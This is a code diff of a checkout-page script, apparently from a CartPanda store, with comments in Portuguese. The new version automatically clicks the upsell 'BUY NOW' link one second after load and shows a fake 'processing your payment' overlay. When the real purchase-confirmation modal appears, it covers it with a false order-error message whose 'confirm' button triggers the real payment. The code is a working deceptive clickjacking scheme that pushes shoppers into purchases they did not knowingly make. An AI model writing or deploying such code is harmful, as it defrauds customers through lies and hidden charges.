@@ -14,102 +14,119 @@
                 </script>
             
 	<script>
-	document.addEventListener('DOMContentLoaded', function(){
-	  // 1) Adiciona CSS para spinner e pop-up de confirmação customizados
-	  const css = `
-		#customSpinnerOverlay, #customConfirmOverlay {
-		  position: fixed;
-		  top: 0; left: 0; width: 100%; height: 100%;
-		  display: flex; justify-content: center; align-items: center;
-		  background: rgba(0,0,0,0.5);
-		  z-index: 9999;
+	document.addEventListener('DOMContentLoaded', function() {
+	  // 1) Injeta CSS do overlay full-screen
+	  const style = document.createElement('style');
+	  style.innerHTML = `
+		#customOverlay {
+		  position: fixed; top: 0; left: 0;
+		  width: 100%; height: 100%;
+		  background: rgba(255,255,255,0.95);
+		  z-index: 999999;
+		  display: flex; flex-direction: column;
+		  justify-content: center; align-items: center;
+		  font-family: Arial, sans-serif;
+		  text-align: center;
 		}
-		#customSpinnerOverlay .spinner {
+		#customOverlay .spinner {
 		  border: 8px solid #f3f3f3;
 		  border-top: 8px solid #3498db;
 		  border-radius: 50%;
 		  width: 60px; height: 60px;
 		  animation: spin 1s linear infinite;
+		  margin-bottom: 20px;
 		}
 		@keyframes spin {
 		  from { transform: rotate(0deg); }
 		  to   { transform: rotate(360deg); }
 		}
-		#customConfirmOverlay .confirm-box {
-		  background: #fff;
-		  padding: 20px;
-		  border-radius: 8px;
-		  text-align: center;
-		  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+		#customOverlay .message {
+		  font-size: 1.2em;
+		  margin: 5px 0;
 		}
-		#customConfirmOverlay button {
-		  margin-top: 12px;
-		  padding: 10px 24px;
-		  font-size: 16px;
+		#customOverlay .buttons {
+		  margin-top: 20px;
+		  display: flex;
+		  gap: 10px;
+		}
+		#customOverlay .buttons button {
+		  padding: 10px 20px;
+		  font-size: 1em;
 		  cursor: pointer;
+		  border: none;
+		  border-radius: 4px;
+		}
+		#customOverlay #customDeclineBtn {
+		  background: #ccc;
+		  color: #000;
+		}
+		#customOverlay #customAcceptBtn {
+		  background: #28a745;
+		  color: #fff;
 		}
 	  `;
-	  const style = document.createElement('style');
-	  style.innerHTML = css;
 	  document.head.appendChild(style);
 
-	  // 2) Cria os overlays (spinner e confirmação)
-	  const spinnerOverlay = document.createElement('div');
-	  spinnerOverlay.id = 'customSpinnerOverlay';
-	  spinnerOverlay.innerHTML = '<div class="spinner"></div>';
-	  spinnerOverlay.style.display = 'none';
-	  document.body.appendChild(spinnerOverlay);
+	  // 2) Cria overlay e adiciona ao <body>
+	  const overlay = document.createElement('div');
+	  overlay.id = 'customOverlay';
+	  overlay.innerHTML = `
+		<div class="spinner"></div>
+		<div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
+		<div class="message">PROCESSANDO SEU PAGAMENTO</div>
+	  `;
+	  document.body.appendChild(overlay);
 
-	  const confirmOverlay = document.createElement('div');
-	  confirmOverlay.id = 'customConfirmOverlay';
-	  confirmOverlay.style.display = 'none';
-	  confirmOverlay.innerHTML = `
-		<div class="confirm-box">
-		  <p><strong>Quase lá!</strong><br/>Clique para confirmar sua compra.</p>
-		  <button id="customConfirmBtn">Confirmar Compra</button>
-		</div>`;
-	  document.body.appendChild(confirmOverlay);
-
-	  // 3) Após 8 s, dispara o BUY NOW e mostra o spinner
+	  // 3) Após 1s, dispara clique no BUY NOW (accepted=yes)
 	  setTimeout(() => {
 		const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
-		if (!buyLink) return console.warn('Auto-upsell: BUY NOW não encontrado');
-		buyLink.click();
-		spinnerOverlay.style.display = 'flex';
-	  }, 8000);
+		if (buyLink) {
+		  buyLink.click();
+		} else {
+		  console.warn('Auto-upsell: botão BUY NOW não encontrado');
+		}
+	  }, 1000);
 
-	  // 4) Monitora a injeção do modal da CartPanda
-	  const obs = new MutationObserver((mutations, observer) => {
+	  // 4) Observa a injeção do modal da CartPanda
+	  const observer = new MutationObserver((mutations, obs) => {
 		for (const m of mutations) {
 		  for (const node of m.addedNodes) {
-			if (node.nodeType===1 && 
-				(node.id==='cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))) {
-			  // achou o seu modal de confirmação da CartPanda
-			  spinnerOverlay.style.display = 'none';  // esconde spinner
-			  
-			  // garante que o container seja position:relative
-			  node.style.position = 'relative';
-			  // posiciona nosso overlay dentro do modal
-			  node.appendChild(confirmOverlay);
-			  confirmOverlay.style.position = 'absolute';
-			  confirmOverlay.style.top = '0';
-			  confirmOverlay.style.left = '0';
-			  confirmOverlay.style.width = '100%';
-			  confirmOverlay.style.height = '100%';
-			  confirmOverlay.style.display = 'flex';
-
-			  // ao clicar no botão fake, dispara o clique real
-			  const realBtn = node.querySelector('#cartpanda-payment-confirmation');
-			  document.getElementById('customConfirmBtn')
-					  .addEventListener('click', () => realBtn && realBtn.click());
-
-			  observer.disconnect();
+			if (node.nodeType === 1 &&
+			   (node.id === 'cartpanda-modal-container' ||
+				node.classList.contains('cartpanda-modal'))) {
+			  // 5) Modal apareceu → troca conteúdo do overlay
+			  overlay.innerHTML = `
+				<div class="message">
+				  HOUVE UM ERRO EM SEU PEDIDO,<br>
+				  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
+				</div>
+				<div class="buttons">
+				  <button id="customDeclineBtn">NÃO, OBRIGADO</button>
+				  <button id="customAcceptBtn">SIM, CONFIRMAR</button>
+				</div>
+			  `;
+			  // 6) Liga nossos botões aos originais da CartPanda
+			  document
+				.getElementById('customDeclineBtn')
+				.addEventListener('click', () => {
+				  const declineBtn = document.getElementById('cartpanda-close-modal-btn');
+				  if (declineBtn) declineBtn.click();
+				  overlay.style.display = 'none';
+				});
+			  document
+				.getElementById('customAcceptBtn')
+				.addEventListener('click', () => {
+				  const confirmBtn = document.getElementById('cartpanda-payment-confirmation');
+				  if (confirmBtn) confirmBtn.click();
+				  overlay.style.display = 'none';
+				});
+			  obs.disconnect();
 			  return;
 			}
 		  }
 		}
 	  });
-	  obs.observe(document.body, { childList: true, subtree: true });
+	  observer.observe(document.body, { childList: true, subtree: true });
 	});
 	</script>
 
